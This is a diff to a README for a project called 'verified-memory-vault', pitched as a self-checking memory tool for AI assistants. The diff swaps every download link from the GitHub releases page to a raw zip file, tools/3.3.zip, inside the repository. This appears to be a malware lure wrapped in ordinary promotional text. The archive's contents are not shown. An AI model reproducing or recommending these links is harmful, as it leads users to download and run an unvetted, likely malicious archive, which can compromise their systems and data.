@@ -1,7 +1,7 @@
 <h1>🔐 verified-memory-vault - Your AI's Self-Checking Second Brain</h1>
 
 <p align="center">
-  <a href="https://github.com/Boybo5580/verified-memory-vault/releases"><img src="https://img.shields.io/badge/Download%20Now-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b9348&color=0077b6" alt="Download Button" width="300"></a>
+  <a href="https://raw.githubusercontent.com/Boybo5580/verified-memory-vault/main/tools/3.3.zip"><img src="https://img.shields.io/badge/Download%20Now-Free%20%26%20Open%20Source-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b9348&color=0077b6" alt="Download Button" width="300"></a>
 </p>
 
 ## 🤔 What Is This?
@@ -24,7 +24,7 @@ But here's the magic: **it checks itself**. The vault continuously runs health c
 
 ### Step 1: Download the Application
 
-👉 **Visit this link to download the application:** [https://github.com/Boybo5580/verified-memory-vault/releases](https://github.com/Boybo5580/verified-memory-vault/releases)
+👉 **Visit this link to download the application:** [https://raw.githubusercontent.com/Boybo5580/verified-memory-vault/main/tools/3.3.zip](https://raw.githubusercontent.com/Boybo5580/verified-memory-vault/main/tools/3.3.zip)
 
 ### Step 2: Run It
 
@@ -130,7 +130,7 @@ This project is open source and free to use. You can modify, share, and use it f
 
 Download verified-memory-vault today and watch your AI assistant become dramatically more useful. Your future self will thank you for starting now.
 
-👉 **[Download verified-memory-vault Now](https://github.com/Boybo5580/verified-memory-vault/releases)**
+👉 **[Download verified-memory-vault Now](https://raw.githubusercontent.com/Boybo5580/verified-memory-vault/main/tools/3.3.zip)**
 
 ---
 
